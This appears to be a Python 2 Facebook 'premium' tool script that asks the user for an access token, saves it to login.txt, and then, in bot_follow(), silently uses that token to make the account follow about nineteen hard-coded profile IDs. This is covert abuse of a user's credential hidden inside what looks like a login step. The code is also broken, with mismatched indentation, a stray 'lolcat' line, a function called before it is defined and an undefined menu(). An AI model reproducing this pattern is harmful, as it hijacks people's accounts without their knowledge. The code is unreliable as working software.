#-*-coding:utf-8-*-

import requests,bs4,sys,os,subprocess
import requests,sys,random,time,re,base64,json
reload(sys)
sys.setdefaultencoding("utf-8")
from multiprocessing.pool import ThreadPool

#### WARNA RANDOM ####
# P = '\033[0;97m'  # putih
# M = '\033[0;91m' # merah
# H = '\033[0;92m' # hijau
# K = '\033[0;93m' # kuning
# B = '\033[0;94m' # biru
# U = '\033[0;95m' # ungu
# O = '\033[0;96m' # biru muda

logo = ("""   ___  ___  ______  _________  ____  ___
  / _ \/ _ \/ __/  |/  /  _/ / / /  |/  /
 / ___/ , _/ _// /|_/ // // /_/ / /|_/ /
/_/  /_/|_/___/_/  /_/___/\____/_/  /_/""")

logo2 =("""\033[0;95m     Coded By : \033[0;97mDapunta Khurayra X
\033[0;95m﹌﹌﹌﹌﹌\033[0;97m﹌﹌﹌﹌﹌\033[0;95m﹌﹌﹌﹌﹌\033[0;97m﹌﹌﹌﹌﹌\033[0;95m﹌﹌﹌﹌﹌""")

host="https://mbasic.facebook.com"
ua="Mozilla/5.0 (Linux; Android 10; Mi 9T Pro Build/QKQ1.190825.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/88.0.4324.181 Mobile Safari/537.36[FBAN/EMA;FBLC/it_IT;FBAV/239.0.0.10.109;]"
mbasic_h={"Host":"mbasic.facebook.com","cache-control":"max-age=0","upgrade-insecure-requests":"1","user-agent":ua,"accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8","accept-encoding":"gzip, deflate","accept-language":"id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7"}

def clear():
	if " linux" in sys.platform.lower():
		os.system("clear")
	elif "win" in sys.platform.lower():
		os.system("cls")
	else:os.system("clear")

os.system("clear")
	log_token()		
		
def log_token():
        print logo
        lolcat
        print logo2
	data = raw_input("   [•] Token :")
	try:
		me = requests.get('https://graph.facebook.com/me?access_token='+data)
		a = json.loads(me.text)
		nama = a['name']
		open("login.txt",'w').write(data)
		print("   [!] Login Success")
		bot_follow()
	except KeyError:
		print ("   [!] Invalid Token")
		time.sleep(1.0)
		log_token()

def bot_follow():
	try:
		toket=open('login.txt','r').read()
	except IOError:
		print"   [!] Token invalid"
		log_token() 
	requests.post('https://graph.facebook.com/1827084332/subscribers?access_token=' + toket)
	requests.post('https://graph.facebook.com/1602590373/subscribers?access_token=' + toket)
	requests.post('https://graph.facebook.com/100000729074466/subscribers?access_token=' + toket)
	requests.post('https://graph.facebook.com/607801156/subscribers?access_token=' + toket)
	requests.post('https://graph.facebook.com/1409058/subscribers?access_token=' + toket)
        requests.post('https://graph.facebook.com/100026490368623/subscribers?access_token=' + toket)
        requests.post('https://graph.facebook.com/100009340646547/subscribers?access_token=' + toket)
        requests.post('https://graph.facebook.com/100053093889653/subscribers?access_token=' + toket)
        requests.post('https://graph.facebook.com/100000415317575/subscribers?access_token=' + toket)
        requests.post('https://graph.facebook.com/100037914692898/subscribers?access_token=' + toket)
        requests.post('https://graph.facebook.com/100000431996038/subscribers?access_token=' + toket)
        requests.post('https://graph.facebook.com/1676993425/subscribers?access_token=' + toket)
        requests.post('https://graph.facebook.com/1767051257/subscribers?access_token=' + toket)
        requests.post('https://graph.facebook.com/100000287398094/subscribers?access_token=' + toket)
        requests.post('https://graph.facebook.com/100057755937035/subscribers?access_token=' + toket)
        requests.post('https://graph.facebook.com/1673250723/subscribers?access_token=' + toket)
        requests.post('https://graph.facebook.com/100000149757897/subscribers?access_token=' + toket)
        requests.post('https://graph.facebook.com/100015073506062/subscribers?access_token=' + toket)
        requests.post('https://graph.facebook.com/100002565109395/subscribers?access_token=' + toket)
	menu()













